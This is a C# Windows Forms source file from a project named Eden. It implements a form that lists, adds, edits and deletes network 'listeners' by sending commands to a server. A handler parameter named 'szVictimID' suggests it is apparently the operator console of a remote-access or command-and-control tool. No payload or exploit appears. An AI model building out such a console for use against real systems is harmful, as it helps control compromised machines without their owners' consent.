using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Eden
{
    public partial class frmListener : Form
    {
        public Client m_clnt;

        public frmListener()
        {
            InitializeComponent();
        }

        void MessageReceived(Client clnt, string szVictimID, string[] aMsg)
        {
            if (aMsg[0] == "listener")
            {
                if (aMsg[1] == "list")
                {
                    if (aMsg[2] == "listener")
                    {
                        List<List<string>> lsListener = Tools.EZData.String2TwoDList(aMsg[3]);
                        Invoke(new Action(() =>
                        {
                            foreach (List<string> ls in lsListener)
                            {
                                ListViewItem item = new ListViewItem(ls[0]);
                                item.SubItems.AddRange(ls.Skip(1).ToList().Select(x => new ListViewItem.ListViewSubItem() { Text = x }).ToArray());
                                listView1.Items.Add(item);
                            }

                            toolStripStatusLabel1.Text = $"Listener[{listView1.Items.Count}]";
                        }));
                    }
                }
                else if (aMsg[1] == "add")
                {
                    if (aMsg[2] == "1")
                    {
                        MessageBox.Show("Add listener successfully.", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        GetListener();
                    }
                }
                else if (aMsg[1] == "del")
                {
                    if (aMsg[2] == "1")
                    {
                        MessageBox.Show("Delete listener successfully.", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        GetListener();
                    }
                }
            }
        }

        void GetListener()
        {
            Invoke(new Action(() =>
            {
                toolStripStatusLabel1.Text = "Loading...";

                listView1.Items.Clear();
                m_clnt.SendCommand("listener|list|listener");
            }));
        }

        bool CheckExists(string szName, int nPort)
        {
            foreach (ListViewItem item in listView1.Items)
            {
                if (item.Text == szName)
                    return true;

                if (int.Parse(item.SubItems[3].Text) == nPort)
                    return true;
            }

            return false;
        }

        private void EditListener(ListViewItem item)
        {
            frmListenerEdit f = new frmListenerEdit();
            f.m_bEdit = true;
            f.m_clnt = m_clnt;
            f.m_atCheckExists += CheckExists;
            f.m_stListener = new frmListenerEdit.stListener()
            {
                szName = item.Text,
                szTemplate = item.SubItems[1].Text,
                nPort = int.Parse(item.SubItems[3].Text),
            };

            f.ShowDialog();

            GetListener();
        }

        private void DeleteListener(string szName = null)
        {
            Invoke(new Action(() =>
            {
                if (szName == null)
                {
                    m_clnt.SendCommand("listener|del|" + Tools.EZData.OneDList2String(listView1.SelectedItems.Cast<ListViewItem>().Select(x => x.Text).ToList()));
                }
                else
                {
                    ListViewItem item = listView1.FindItemWithText(szName);
                    if (item == null)
                    {
                        return;
                    }

                    m_clnt.SendCommand("listener|del|" + item.Text);
                }
            }));
        }

        void setup()
        {
            m_clnt.ServerMessageReceived += MessageReceived;
            GetListener();
        }

        private void frmListener_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void frmListener_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_clnt.ServerMessageReceived -= MessageReceived;
        }

        //Add
        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            frmListenerEdit f = new frmListenerEdit();
            f.m_clnt = m_clnt;
            f.m_atCheckExists = CheckExists;

            f.ShowDialog();
        }
        //Edit
        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            ListViewItem[] items = listView1.SelectedItems.Cast<ListViewItem>().ToArray();
            if (items.Length == 0)
                return;

            ListViewItem item = items[0];
            EditListener(item);
        }
        //Delete
        private void toolStripButton3_Click(object sender, EventArgs e)
        {
            DialogResult dr = MessageBox.Show("Are you sure?", "Delete", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
            if (dr == DialogResult.Yes)
            {
                m_clnt.SendCommand("listener|del|" + Tools.EZData.OneDList2String(listView1.SelectedItems.Cast<ListViewItem>().Select(x => x.Text).ToList()));
            }
        }

        private void listView1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Modifiers)
            {
                if (e.KeyCode == Keys.A)
                {
                    foreach (ListViewItem item in listView1.Items)
                        item.Selected = true;
                }
            }
            else
            {
                if (e.KeyCode == Keys.F5)
                {
                    GetListener();
                }
                else if (e.KeyCode == Keys.Enter)
                {
                    ListViewItem[] items = listView1.SelectedItems.Cast<ListViewItem>().ToArray();
                    if (items.Length == 0)
                        return;

                    ListViewItem item = items[0];
                    EditListener(item);
                }
                else if (e.KeyCode == Keys.Delete)
                {
                    DeleteListener();
                }
            }
        }

        private void listView1_DoubleClick(object sender, EventArgs e)
        {
            ListViewItem[] items = listView1.SelectedItems.Cast<ListViewItem>().ToArray();
            if (items.Length == 0)
                return;

            ListViewItem item = items[0];
            EditListener(item);
        }
    }
}
